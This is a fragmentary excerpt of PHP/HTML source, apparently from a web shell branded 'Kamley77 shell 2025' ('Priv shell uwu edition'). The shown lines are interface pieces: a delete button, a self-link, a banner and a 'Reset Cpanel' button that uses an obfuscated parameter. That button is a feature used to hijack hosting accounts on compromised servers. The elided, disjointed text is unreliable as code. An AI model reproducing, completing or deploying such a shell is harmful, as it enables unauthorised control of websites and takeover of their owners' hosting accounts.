...
<i class='fa fa-trash'></i></button>";
    ...
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="' . $_SERVER['SCRIPT_NAME'] . '"><i class="fa-brands fa-napster"></i> Kamley77 </a></center></div></td><td>';
...
<button class="btn btn-outline-light" onclick=location.href="?path=' . $serlok . '&' . net("resetcp") . '=opet">Reset Cpanel</button><hr>&nbsp;';
    ...
    <img class='crot' src='https://becomingthemuse.net/wp-content/uploads/2024/09/1337-flaming-text.gif'/> Priv shell uwu edition</div><hr>
    <br> - Kamley77 shell 2025 <br> - Created by Kamley77</td></thead></table>";
        exit();
